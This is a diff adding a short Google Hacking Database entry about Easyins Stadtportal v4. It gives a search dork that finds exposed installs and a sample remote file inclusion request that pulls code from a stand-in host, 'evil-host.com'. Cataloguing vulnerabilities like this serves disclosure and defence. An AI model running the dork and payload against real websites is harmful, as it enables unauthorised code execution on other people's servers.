@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/388
+Category:         Vulnerable Servers
+Published Date:   2004-07-29
+Author:           anonymous
+GoogleDork:       allinurl:"index.php" "site=sglinks"
+Description:      allinurl:"index.php" "site=sglinks"
+
+
+Easyins Stadtportal v4 is a German Content Management System for cities and regions. Version 4 and prior seems to be vulnerable to a code inclusion in index.php. Bugtraq: http://www.securityfocus.com/bid/10795http://www.host-vulnerable.com/stadtportal-path/index.php?site=http://www.evil-host.com
